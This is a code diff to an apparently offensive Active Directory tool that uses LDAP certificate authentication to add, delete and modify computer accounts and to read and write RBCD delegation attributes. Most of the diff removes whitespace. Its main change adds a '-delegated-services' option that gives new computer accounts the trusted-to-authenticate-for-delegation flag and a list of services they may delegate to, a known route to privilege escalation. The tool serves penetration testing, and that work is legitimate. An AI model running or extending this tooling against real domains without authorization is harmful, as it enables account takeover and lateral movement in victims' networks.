@@ -10,13 +10,13 @@
 #
 # Description:
 #   This script implements LDAP certificate authentication for two impacket scripts : addComputer.py and rbcd.py.
-#   
+#
 #   If you use Certipy (https://github.com/ly4k/Certipy) to retrieve certificates, you can extract key and cert from the pfx by using:
 #       $ certipy cert -pfx user.pfx -nokey -out user.crt
 #       $ certipy cert -pfx user.pfx -nocert -out user.key
 #
 # Author:
-#   drm (@lowercase_drm) / ThePirateWhoSmellsOfSunflowers 
+#   drm (@lowercase_drm) / ThePirateWhoSmellsOfSunflowers
 #
 #   based on :
 #        JaGoTu (@jagotu) work on https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
@@ -270,7 +270,7 @@ class ManageComputer:
         self.__domain = cmdLineOptions.domain
         self.__computerName = cmdLineOptions.computer_name
         self.__computerPassword = cmdLineOptions.computer_pass
-        self.__domainNetbios = cmdLineOptions.domain_netbios       
+        self.__domainNetbios = cmdLineOptions.domain_netbios
         self.__baseDN = cmdLineOptions.baseDN
         self.__computerGroup = cmdLineOptions.computer_group
 
@@ -311,7 +311,7 @@ class ManageComputer:
         # LDAP whoami returns an authzId, so we strip the prefix
         logging.info('You are logged in as: %s' % current_user[2:])
 
-    def add_computer(self):
+    def add_computer(self, constrained_delegations = None):
         if self.__computerName is not None:
             if self.LDAPComputerExists(ldapConn, self.__computerName):
                 raise Exception("Account %s already exists! If you just want to set a password, use -no-add." % self.__computerName)
@@ -340,6 +340,15 @@ class ManageComputer:
             'unicodePwd': ('"%s"' % self.__computerPassword).encode('utf-16-le')
         }
 
+        # Add constrained delegations fields to the computer
+        if constrained_delegations and len(constrained_delegations) > 0:
+            # Set the TRUSTED_TO_AUTH_FOR_DELEGATION and WORKSTATION_TRUST_ACCOUNT flags
+            # MS doc: https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties
+            ucd['userAccountControl'] = 0x1000000|0x1000
+            # Set the list of services authorized (format: protocol/FQDNserver)
+            ucd['msDS-AllowedToDelegateTo'] = constrained_delegations.split(',') #Split multiple services in the command line
+            logging.info("Adding contrained delegations services to the computer object: %s" % constrained_delegations)
+
         res = ldapConn.add(computerDn, ['top','person','organizationalPerson','user','computer'], ucd)
         if not res:
             if ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
@@ -358,7 +367,7 @@ class ManageComputer:
     def delete_computer(self):
         if not self.LDAPComputerExists(ldapConn, self.__computerName):
             raise Exception("Account %s not found in %s!" % (self.__computerName, self.__baseDN))
-        
+
         computer = self.LDAPGetComputer(ldapConn, self.__computerName)
         res = ldapConn.delete(computer.entry_dn)
         if not res:
@@ -372,7 +381,7 @@ class ManageComputer:
     def modify_computer(self):
         if not self.LDAPComputerExists(ldapConn, self.__computerName):
             raise Exception("Account %s not found in %s!" % (self.__computerName, self.__baseDN))
-        
+
         computer = self.LDAPGetComputer(ldapConn, self.__computerName)
         res = ldapConn.modify(computer.entry_dn, {'unicodePwd': [(ldap3.MODIFY_REPLACE, ['"{}"'.format(self.__computerPassword).encode('utf-16-le')])]})
         if not res:
@@ -381,7 +390,7 @@ class ManageComputer:
             else:
                 raise Exception(str(ldapConn.result))
         else:
-            logging.info("Succesfully set password of %s to %s." % (self.__computerName, self.__computerPassword))   
+            logging.info("Succesfully set password of %s to %s" % (self.__computerName, self.__computerPassword))
 
     def LDAPComputerExists(self, connection, computerName):
         connection.search(self.__baseDN, '(sAMAccountName=%s)' % computerName)
@@ -408,7 +417,7 @@ if __name__ == '__main__':
 
     group = parser.add_argument_group('Action')
     group.add_argument('-action', choices=['add_computer', 'del_computer', 'modify_computer', 'read_rbcd', 'write_rbcd', 'remove_rbcd', 'flush_rbcd', 'whoami'], nargs='?', default='whoami')
-    
+
     group = parser.add_argument_group('Manage Computer')
     group.add_argument('-baseDN', action='store', metavar='DC=test,DC=local', help='Set baseDN for LDAP.'
                                                                                     'If ommited, the domain part (FQDN) '
@@ -422,6 +431,7 @@ if __name__ == '__main__':
                                                                                  'If omitted, a random DESKTOP-[A-Z0-9]{8} will be used.')
     group.add_argument('-computer-pass', action='store', metavar='password', help='Password to set to computer. '
                                                                                  'If omitted, a random [A-Za-z0-9]{32} will be used.')
+    group.add_argument('-delegated-services', type=str, action='store', metavar='cifs/srv01.domain.local,ldap/srv01.domain.local', help='Services to configure in constrained delegation to configure to the new computer (no space in the list)')
 
     group = parser.add_argument_group('RBCD attack')
     group.add_argument("-delegate-to", type=str, required=False,
@@ -466,29 +476,29 @@ if __name__ == '__main__':
             target = options.dc_host
 
         tls = ldap3.Tls(local_private_key_file=options.key, local_certificate_file=options.crt, validate=ssl.CERT_NONE)
-        
-        ldap_server_kwargs = {'use_ssl': options.port == 636, 
+
+        ldap_server_kwargs = {'use_ssl': options.port == 636,
                               'port': options.port,
                               'get_info': ldap3.ALL,
                               'tls': tls}
 
         ldapServer = ldap3.Server(target, **ldap_server_kwargs)
-        
+
         ldap_connection_kwargs = dict()
-        
+
         if options.port == 389:
             # I don't really know why, but using this combinaison of parameters with ldap3 will
             # send a LDAP_SERVER_START_TLS_OID and trigger a StartTLS
             ldap_connection_kwargs = {'authentication': ldap3.SASL,
                                       'sasl_mechanism': ldap3.EXTERNAL,
                                       'auto_bind': ldap3.AUTO_BIND_TLS_BEFORE_BIND}
-                                      
+
         ldapConn = ldap3.Connection(ldapServer, **ldap_connection_kwargs)
 
         if options.port == 636:
-            # According to Microsoft : 
+            # According to Microsoft :
             # "If the client establishes the SSL/TLS-protected connection by means of connecting
-            # on a protected LDAPS port, then the connection is considered to be immediately 
+            # on a protected LDAPS port, then the connection is considered to be immediately
             # authenticated (bound) as the credentials represented by the client certificate.
             # An EXTERNAL bind is not allowed, and the bind will be rejected with an error."
             # Using bind() function will raise an error, we just have to open() the connection
@@ -497,7 +507,7 @@ if __name__ == '__main__':
         if options.action in ('add_computer','del_computer','modify_computer', 'whoami'):
             manage = ManageComputer(ldapConn, options)
             if options.action == 'add_computer':
-                manage.add_computer()
+                manage.add_computer(options.delegated_services)
             elif options.action == 'del_computer':
                 manage.delete_computer()
             elif options.action == 'modify_computer':
@@ -509,7 +519,7 @@ if __name__ == '__main__':
             if options.delegate_to is None:
                 logging.critical('-delegate-to is required !')
                 sys.exit(1)
-                
+
             rbcd = RBCD(ldapServer, ldapConn, options.delegate_to)
             if options.action == 'read_rbcd':
                 rbcd.read()
@@ -519,10 +529,9 @@ if __name__ == '__main__':
                 rbcd.remove(options.delegate_from)
             elif options.action == 'flush_rbcd':
                 rbcd.flush()
-            
+
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
             traceback.print_exc()
         print(str(e))
-
